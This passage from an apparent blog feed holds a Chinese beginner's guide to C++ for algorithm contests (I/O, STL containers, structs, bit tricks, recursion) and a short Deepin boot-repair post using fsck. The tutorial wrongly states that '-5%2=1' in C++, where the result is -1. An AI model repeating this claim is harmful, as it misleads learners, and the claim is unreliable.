class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">friend</span> Time;</span><br><span class="line">&nbsp; &nbsp; <span class="built_in">Date</span>(<span class="type">int</span> m, <span class="type">int</span> d, <span class="type">int</span> y): <span class="built_in">month</span>(m), <span class="built_in">day</span>(d), <span class="built_in">year</span>(y) {};</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> month;</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> day;</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> year;</span><br><span class="line">};</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Time::display</span><span class="params">(Date &amp;d)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;d.month&lt;&lt;<span class="string">"/"</span>&lt;&lt;d.day&lt;&lt;<span class="string">"/"</span>&lt;&lt;d.year&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;hour&lt;&lt;<span class="string">":"</span>&lt;&lt;minute&lt;&lt;<span class="string">":"</span>&lt;&lt;sec&lt;&lt;endl;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">&nbsp; &nbsp; <span class="function">Date <span class="title">d1</span><span class="params">(<span class="number">01</span>, <span class="number">01</span>, <span class="number">2019</span>)</span></span>;</span><br><span class="line">&nbsp; &nbsp; <span class="function">Time <span class="title">t1</span><span class="params">(<span class="number">15</span>, <span class="number">57</span>, <span class="number">56</span>)</span></span>;</span><br><span class="line">&nbsp; &nbsp; t<span class="number">1.</span><span class="built_in">display</span>(d1);</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法基础入门</title>
      <link href="/posts/2564232462/"/>
      <url>/posts/2564232462/</url>
      
        <content type="html"><![CDATA[<h1 id="算法竞赛基础入门"><a href="#算法竞赛基础入门" class="headerlink" title="算法竞赛基础入门"></a>算法竞赛基础入门</h1><h2 id="一、基础语法"><a href="#一、基础语法" class="headerlink" title="一、基础语法"></a>一、基础语法</h2><h3 id="1-数据类型（算法中最常用的）"><a href="#1-数据类型（算法中最常用的）" class="headerlink" title="1. 数据类型（算法中最常用的）"></a>1. 数据类型（算法中最常用的）</h3><ul><li><p><strong>整数</strong>：int（4 字节，范围约 ±2e9）、long long（8 字节，范围约 ±9e18，处理大数字必用，避免溢出）</p></li><li><p><strong>浮点数</strong>：double（双精度，处理小数，注意精度误差）</p></li><li><p><strong>字符</strong>：char（单个字符，如 ‘a’、’3’）</p></li><li><p><strong>布尔</strong>：bool（值为true/false，判断条件用）</p></li></ul><p>注意：算法题中 “大整数”（如 1e18）必须用long long，否则会溢出！</p><h3 id="2-变量与常量"><a href="#2-变量与常量" class="headerlink" title="2. 变量与常量"></a>2. 变量与常量</h3><ul><li><p>变量：数据类型 变量名 = 初始值; 例：int a = 5; long long b = 1e18;</p></li><li><p>常量：用const定义（不可修改），例：const int N = 1e5;（定义数组大小常用）</p></li><li><p>数组定义与变量常量的关系：</p></li><li><ul><li>数组大小需为常量或常量表达式，如const int size = 10; int arr[size];</li></ul></li><li><ul><li>不能用变量直接定义数组大小，如int n = 5; int arr[n];（错误），需用动态数组vector</li></ul></li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">5</span>];</span><br><span class="line">arr[<span class="number">5</span>] = <span class="number">10</span>; <span class="comment">// 错误！数组下标0-4</span></span><br></pre></td></tr></tbody></table></figure><h3 id="3-输入输出（算法题的-“接口”）"><a href="#3-输入输出（算法题的-“接口”）" class="headerlink" title="3. 输入输出（算法题的 “接口”）"></a>3. 输入输出（算法题的 “接口”）</h3><ul><li><strong>cin/cout</strong>（C++ 风格，简单但默认较慢）：</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">int</span> x; </span><br><span class="line">    cin &gt;&gt; x;  <span class="comment">// 输入单个整数</span></span><br><span class="line">    cout &lt;&lt; x &lt;&lt; <span class="string">" "</span>;  <span class="comment">// 输出单个整数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数组的输入输出</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> N = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> arr[N];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) {</span><br><span class="line">        cin &gt;&gt; arr[i];  <span class="comment">// 输入数组元素</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) {</span><br><span class="line">        cout &lt;&lt; arr[i] &lt;&lt; <span class="string">" "</span>;  <span class="comment">// 输出数组元素</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li><strong>scanf/printf</strong>（C 风格，速度快，处理大量数据必用）：</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">int</span> x; </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);  <span class="comment">// 输入整数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d "</span>, x);  <span class="comment">// 输出整数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数组的输入输出</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> N = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> arr[N];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) {</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;arr[i]);  <span class="comment">// 输入数组元素</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, arr[i]);  <span class="comment">// 输出数组元素</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>提示：比赛中加一句ios::sync_with_stdio(false); cin.tie(0);可以让 cin/cout 速度接近 scanf/printf（放在 main 函数开头）。</p><h3 id="4-运算符与表达式"><a href="#4-运算符与表达式" class="headerlink" title="4. 运算符与表达式"></a>4. 运算符与表达式</h3><ul><li><p>算术运算符：+ - * / %（%是取模，例：5%2=1；注意负数取模结果为正，如-5%2=1）</p></li><li><p>比较运算符：&gt; &lt; &gt;= &lt;= == !=（返回 bool 值，用于条件判断）</p></li><li><p>逻辑运算符：&amp;&amp;（与）、||（或）、!（非）</p></li></ul><h3 id="5-控制流（程序的-“逻辑”）"><a href="#5-控制流（程序的-“逻辑”）" class="headerlink" title="5. 控制流（程序的 “逻辑”）"></a>5. 控制流（程序的 “逻辑”）</h3><ul><li><strong>条件语句</strong>：处理分支逻辑</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件<span class="number">1</span>) {</span><br><span class="line">    <span class="comment">// 条件1成立时执行</span></span><br><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> (条件<span class="number">2</span>) {</span><br><span class="line">    <span class="comment">// 条件2成立时执行</span></span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    <span class="comment">// 都不成立时执行</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li><p><strong>循环语句</strong>：重复执行代码（算法核心，遍历 / 枚举常用）</p></li><li><ul><li>for循环（最常用，遍历数组 / 范围）：</li></ul></li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) {  <span class="comment">// i从0到9，共10次</span></span><br><span class="line">    cout &lt;&lt; i &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li><ul><li>while循环（条件满足时执行）：</li></ul></li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; <span class="number">10</span>) {</span><br><span class="line">    cout &lt;&lt; i &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    i++;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li><ul><li><strong>范围 for 循环（for each）</strong>：遍历容器或数组（C++11 及以上支持）</li></ul></li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[] = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>};</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> num : arr) {  <span class="comment">// 遍历数组arr，num依次取数组元素值</span></span><br><span class="line">    cout &lt;&lt; num &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v = {<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>};</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> val : v) {  <span class="comment">// 遍历vector v</span></span><br><span class="line">    cout &lt;&lt; val &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="6-数组（连续存储的同类型数据）"><a href="#6-数组（连续存储的同类型数据）" class="headerlink" title="6. 数组（连续存储的同类型数据）"></a>6. 数组（连续存储的同类型数据）</h3><ul><li><p>定义：数据类型 数组名[大小]; 例：int a[10];（10 个 int 元素，下标 0~9）</p></li><li><p>初始化：int a[5] = {1,2,3};（未初始化的元素为 0）</p></li><li><p>访问：a[0] = 10;（通过下标访问，下标从 0 开始！）</p></li><li><p>注意：数组大小必须是 “常量”（如const int N=10; int a[N];），不能用变量直接定义（动态大小用 STL 的 vector）。</p></li></ul><h3 id="7-字符串（字符的序列）"><a href="#7-字符串（字符的序列）" class="headerlink" title="7. 字符串（字符的序列）"></a>7. 字符串（字符的序列）</h3><ul><li>用 C++ 的string类（比 C 的字符数组方便 10 倍）：</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line">string s = <span class="string">"abc"</span>;  <span class="comment">// 初始化</span></span><br><span class="line">s += <span class="string">"d"</span>;  <span class="comment">// 拼接：s变成"abcd"</span></span><br><span class="line"><span class="type">int</span> len = s.<span class="built_in">size</span>();  <span class="comment">// 长度：4</span></span><br><span class="line"><span class="type">char</span> c = s[<span class="number">0</span>];  <span class="comment">// 访问第一个字符：'a'</span></span><br></pre></td></tr></tbody></table></figure><ul><li>常用操作：s.empty()（是否为空）、s.substr(1,2)（从下标 1 取 2 个字符，例：”bc”）</li></ul><h3 id="8-函数：代码的-“模块化”"><a href="#8-函数：代码的-“模块化”" class="headerlink" title="8.函数：代码的 “模块化”"></a>8.函数：代码的 “模块化”</h3><ul><li><p>作用：把重复逻辑封装，避免重复写代码（如 “判断素数”“求最大值”）</p></li><li><p>定义格式：</p></li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">返回值类型 函数名(参数类型 参数<span class="number">1</span>, 参数类型 参数<span class="number">2</span>) {</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">    <span class="keyword">return</span> 结果;  <span class="comment">// 与返回值类型匹配</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li>示例（求两数之和）：</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    cout &lt;&lt; <span class="built_in">add</span>(<span class="number">3</span>,<span class="number">5</span>);  <span class="comment">// 输出8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li>重点：参数用long long时，函数定义和调用都要一致（避免类型不匹配）。</li></ul><h2 id="二、STL（标准模板库）"><a href="#二、STL（标准模板库）" class="headerlink" title="二、STL（标准模板库）"></a>二、STL（标准模板库）</h2><p>STL 是 C++ 自带的工具库，包含现成的数据结构和算法，能大幅简化代码。必须掌握以下内容：</p><h3 id="1-容器（存储数据的-“盒子”）"><a href="#1-容器（存储数据的-“盒子”）" class="headerlink" title="1. 容器（存储数据的 “盒子”）"></a>1. 容器（存储数据的 “盒子”）</h3><h5 id="vector（动态数组，最常用！）："><a href="#vector（动态数组，最常用！）：" class="headerlink" title="vector（动态数组，最常用！）："></a><strong>vector</strong>（动态数组，最常用！）：</h5><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">v.<span class="built_in">push_back</span>(<span class="number">1</span>);  <span class="comment">// v = [1]</span></span><br><span class="line">v.<span class="built_in">push_back</span>(<span class="number">2</span>);  <span class="comment">// v = [1,2]</span></span><br><span class="line">v.<span class="built_in">resize</span>(<span class="number">4</span>);  <span class="comment">// v = [1,2,0,0]</span></span><br><span class="line">v.<span class="built_in">clear</span>();  <span class="comment">// v为空</span></span><br></pre></td></tr></tbody></table></figure><p>用途：存储动态长度的序列（如读入 n 个数，n 未知时）。</p><p>常用函数：</p><ul><li><p>push_back(x)：在末尾添加元素 x</p></li><li><p>pop_back()：删除末尾元素</p></li><li><p>size()：返回元素个数</p></li><li><p>empty()：判断是否为空（空返回 true）</p></li><li><p>clear()：清空所有元素</p></li><li><p>resize(n)：调整容器大小为 n（新增元素为默认值）</p></li><li><p>[]：访问下标对应的元素（如v[0]）</p></li></ul><h5 id="queue（队列，先进先出）："><a href="#queue（队列，先进先出）：" class="headerlink" title="queue（队列，先进先出）："></a><strong>queue</strong>（队列，先进先出）：</h5><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line">queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">q.<span class="built_in">push</span>(<span class="number">1</span>);  <span class="comment">// q = [1]</span></span><br><span class="line">q.<span class="built_in">push</span>(<span class="number">2</span>);  <span class="comment">// q = [1,2]</span></span><br><span class="line"><span class="type">int</span> f = q.<span class="built_in">front</span>();  <span class="comment">// f=1</span></span><br><span class="line"><span class="type">int</span> b = q.<span class="built_in">back</span>();  <span class="comment">// b=2</span></span><br><span class="line">q.<span class="built_in">pop</span>();  <span class="comment">// q = [2]</span></span><br></pre></td></tr></tbody></table></figure><p>用途：BFS（广度优先搜索）必用。</p><p>常用函数：</p><ul><li><p>push(x)：入队（在队尾添加元素 x）</p></li><li><p>pop()：出队（删除队头元素，无返回值）</p></li><li><p>front()：返回队头元素</p></li><li><p>back()：返回队尾元素</p></li><li><p>size()：返回元素个数</p></li><li><p>empty()：判断是否为空</p></li></ul><h5 id="stack（栈，先进后出）："><a href="#stack（栈，先进后出）：" class="headerlink" title="stack（栈，先进后出）："></a><strong>stack</strong>（栈，先进后出）：</h5><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line">stack&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">st.<span class="built_in">push</span>(<span class="number">1</span>);  <span class="comment">// st = [1]</span></span><br><span class="line">st.<span class="built_in">push</span>(<span class="number">2</span>);  <span class="comment">// st = [1,2]</span></span><br><span class="line"><span class="type">int</span> t = st.<span class="built_in">top</span>();  <span class="comment">// t=2</span></span><br><span class="line">st.<span class="built_in">pop</span>();  <span class="comment">// st = [1]</span></span><br></pre></td></tr></tbody></table></figure><p>用途：模拟栈操作、DFS 辅助。</p><p>常用函数：</p><ul><li><p>push(x)：入栈（在栈顶添加元素 x）</p></li><li><p>pop()：出栈（删除栈顶元素，无返回值）</p></li><li><p>top()：返回栈顶元素</p></li><li><p>size()：返回元素个数</p></li><li><p>empty()：判断是否为空</p></li></ul><h5 id="map-unordered-map（键值对映射）："><a href="#map-unordered-map（键值对映射）：" class="headerlink" title="map/unordered_map（键值对映射）："></a><strong>map/unordered_map</strong>（键值对映射）：</h5><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line">unordered_map&lt;string, <span class="type">int</span>&gt; mp;</span><br><span class="line">mp[<span class="string">"apple"</span>] = <span class="number">5</span>;  <span class="comment">// 存："apple"对应5</span></span><br><span class="line"><span class="keyword">if</span> (mp.<span class="built_in">count</span>(<span class="string">"apple"</span>)) {  <span class="comment">// 判断存在</span></span><br><span class="line">    cout &lt;&lt; mp[<span class="string">"apple"</span>];  <span class="comment">// 取：5</span></span><br><span class="line">}</span><br><span class="line">mp.<span class="built_in">erase</span>(<span class="string">"apple"</span>);  <span class="comment">// 删除键"apple"</span></span><br></pre></td></tr></tbody></table></figure><p>用途：计数（如统计数字出现次数）、映射（如字符串转数字）。</p><p>常用函数：</p><ul><li><p>mp[key] = value：插入或修改键值对</p></li><li><p>count(key)：判断 key 是否存在（存在返回 1，否则 0）</p></li><li><p>erase(key)：删除 key 对应的键值对</p></li><li><p>size()：返回键值对个数</p></li><li><p>clear()：清空所有元素</p></li></ul><h5 id="set-unordered-set（集合，去重）："><a href="#set-unordered-set（集合，去重）：" class="headerlink" title="set/unordered_set（集合，去重）："></a><strong>set/unordered_set</strong>（集合，去重）：</h5><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line">unordered_set&lt;<span class="type">int</span>&gt; s;</span><br><span class="line">s.<span class="built_in">insert</span>(<span class="number">1</span>);</span><br><span class="line">s.<span class="built_in">insert</span>(<span class="number">1</span>);  <span class="comment">// 重复插入无效</span></span><br><span class="line"><span class="keyword">if</span> (s.<span class="built_in">count</span>(<span class="number">1</span>)) {  <span class="comment">// 存在</span></span><br><span class="line">    cout &lt;&lt; <span class="string">"存在"</span>;</span><br><span class="line">}</span><br><span class="line">s.<span class="built_in">erase</span>(<span class="number">1</span>);  <span class="comment">// 删除元素1</span></span><br></pre></td></tr></tbody></table></figure><p>用途：去重、快速判断元素是否存在。</p><ul><li><p>常用函数：</p></li><li><p>insert(x)：插入元素 x（自动去重）</p></li><li><p>count(x)：判断 x 是否存在</p></li><li><p>erase(x)：删除元素 x</p></li><li><p>size()：返回元素个数</p></li><li><p>clear()：清空所有元素</p></li></ul><h3 id="2-STL-算法（现成的工具函数）"><a href="#2-STL-算法（现成的工具函数）" class="headerlink" title="2. STL 算法（现成的工具函数）"></a>2. STL 算法（现成的工具函数）</h3><p><strong>sort</strong>（排序，最常用！）：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v = {<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>};</span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>());  <span class="comment">// 从小到大排序：v = [1,2,3]</span></span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());  <span class="comment">// 从大到小：[3,2,1]</span></span><br></pre></td></tr></tbody></table></figure><p>支持数组：int a[3] = {3,1,2}; sort(a, a+3);</p><p><strong>其他常用</strong>：</p><ul><li><p>max(a,b)/min(a,b)：求两数最大 / 小值</p></li><li><p>swap(a,b)：交换 a 和 b 的值</p></li><li><p>reverse(v.begin(), v.end())：反转容器（如数组 /vector）</p></li></ul><h2 id="三、结构体"><a href="#三、结构体" class="headerlink" title="三、结构体"></a>三、结构体</h2><p>算法中常用结构体封装多个相关数据（如点的坐标、边的信息）：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span> {  <span class="comment">// 定义结构体（点）</span></span><br><span class="line">    <span class="type">int</span> x, y;  <span class="comment">// 成员：x坐标和y坐标</span></span><br><span class="line">};</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    Point p;  <span class="comment">// 定义结构体变量</span></span><br><span class="line">    p.x = <span class="number">1</span>;  <span class="comment">// 访问成员</span></span><br><span class="line">    p.y = <span class="number">2</span>;</span><br><span class="line">    vector&lt;Point&gt; points;  <span class="comment">// 可以存入vector</span></span><br><span class="line">    points.<span class="built_in">push_back</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>用途：存储 “点、边、学生信息” 等多字段数据。</p><h2 id="四、其他必备技巧"><a href="#四、其他必备技巧" class="headerlink" title="四、其他必备技巧"></a>四、其他必备技巧</h2><h3 id="1-位运算（高效处理二进制）"><a href="#1-位运算（高效处理二进制）" class="headerlink" title="1. 位运算（高效处理二进制）"></a>1. 位运算（高效处理二进制）</h3><p>常用操作：</p><ul><li><p>&amp;（与）：判断奇偶（x&amp;1为 1 则是奇数）</p></li><li><p>|（或）：设置位为 1</p></li><li><p>^（异或）：交换两数（a^=b; b^=a; a^=b;）、找唯一出现一次的数</p></li><li><p>&lt;&lt;（左移）：x&lt;&lt;1 = x<em>2，**x&lt;&lt;k</em> <em>= x</em>2^k（快速计算倍数）</p></li><li><p>&gt;&gt;（右移）：x&gt;&gt;1 = x/2（向下取整）</p></li></ul><h3 id="2-递归（函数调用自身）"><a href="#2-递归（函数调用自身）" class="headerlink" title="2. 递归（函数调用自身）"></a>2. 递归（函数调用自身）</h3><p>基础用法（如求阶乘）：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">factorial</span><span class="params">(<span class="type">int</span> n)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">// 终止条件（必须有，否则死循环）</span></span><br><span class="line">    <span class="keyword">return</span> n * <span class="built_in">factorial</span>(n<span class="number">-1</span>);  <span class="comment">// 递归调用</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>用途：DFS（深度优先搜索）、分治算法等。</p><h3 id="3-输入输出优化（避免超时）"><a href="#3-输入输出优化（避免超时）" class="headerlink" title="3. 输入输出优化（避免超时）"></a>3. 输入输出优化（避免超时）</h3><p>当数据量大（如 1e5 个数）：</p><ul><li><p>用scanf/printf代替 cin/cout</p></li><li><p>若用 cin/cout，开头加：ios::sync_with_stdio(false); cin.tie(0);</p></li></ul><p>更多详细内容可以查看：<a href="https://oi-wiki.org/lang/">https://oi-wiki.org/lang/</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deepin开机遇见的 [Firmware Bug] initramfs问题</title>
      <link href="/posts/44884/"/>
      <url>/posts/44884/</url>
      
        <content type="html"><![CDATA[<p>[Firmware Bug]： TSC_DEADLINE disabled due to Errata; please update microcode to version: 0x25 (or later) </p><p>解决方法：首先输入exit 然后输入</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsck -y /dev/sd **</span><br></pre></td></tr></tbody></table></figure><p>这里依据出现的提示输入，例如</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsck -y /dev/sda</span><br></pre></td></tr></tbody></table></figure><p>然后再输入exit进入系统 顺便可以更新一下 输入：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install intel-microcode </span><br></pre></td></tr></tbody></table></figure><p>或者：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install amd64-ucode</span><br></pre></td></tr></tbody></table></figure><blockquote><p>功能说明：检查文件系统并尝试修复错误。<br> 语　　法：fsck [-aANPrRsTV][-t &lt;文件系统类型&gt;][文件系统…]<br> 补充说明：当文件系统发生错误四化，可用fsck指令尝试加以修复。<br> 注意：千万不能在运行的系统上面直接执行fsck，特别是RHEL6.0以下ext3的文件系统，否则100%损坏根文件系统，使用fsck -y /dev/sdb1 修复磁盘时，必须将sdb1分区umount掉<br> 参　　数：<br> -a 自动修复文件系统，不询问任何问题。<br> -A 依照/etc/fstab配置文件的内容，检查文件内所列的全部文件系统。<br> -N 